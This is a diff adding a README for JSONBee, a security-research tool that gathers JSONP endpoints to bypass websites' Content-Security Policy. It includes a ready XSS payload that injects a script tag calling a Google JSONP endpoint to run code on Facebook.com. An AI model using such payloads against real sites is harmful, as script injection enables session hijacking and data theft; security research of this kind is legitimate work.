@@ -1,2 +1,22 @@
 # JSONBee
 Collected JSONP endpoints to help bypass content security policy of different websites.
+
+
+# What is JSONBee?
+
+The main idea behind this tool is to bypass content security policy for many websites in an automated way. JSONBee takes an input of a url name (i.e. https://www.facebook.com), parses the CSP (Content-Security Policy), and automatically suggest the XSS payload that would bypass the CSP. It mainly focuses on JSONP endpoints gathered during my bug bounty hunting activities, and could be used to bypass the CSP.
+
+JSONBee relies on 3 methods to gather the JSONP endpoints:
+* The repository within this project;
+* Google dorks;
+* Internet archive (archive.org).
+
+The tool is not yet fully completed as I'm still adding some validations and features too. However, the repository will be hosted here so that anyone can use it till the tool is ready.
+
+The repo contains ready-to-use payloads that can bypass CSP for Facebook.com, Google.com and more.
+
+## Bypasing Facebook.com Content-Security policy:
+Facebook.com allows *.google.com in its CSP policy, thus, below payload would work like a charm:
+`"><script+src="https://cse.google.com/api/007627024705277327428/cse/r3vs7b0fcli/queries/js?callback=alert(1337)"></script>`
+
+Check the jsonp.txt file for the rest of the payloads. The payloads will regulary be updated.
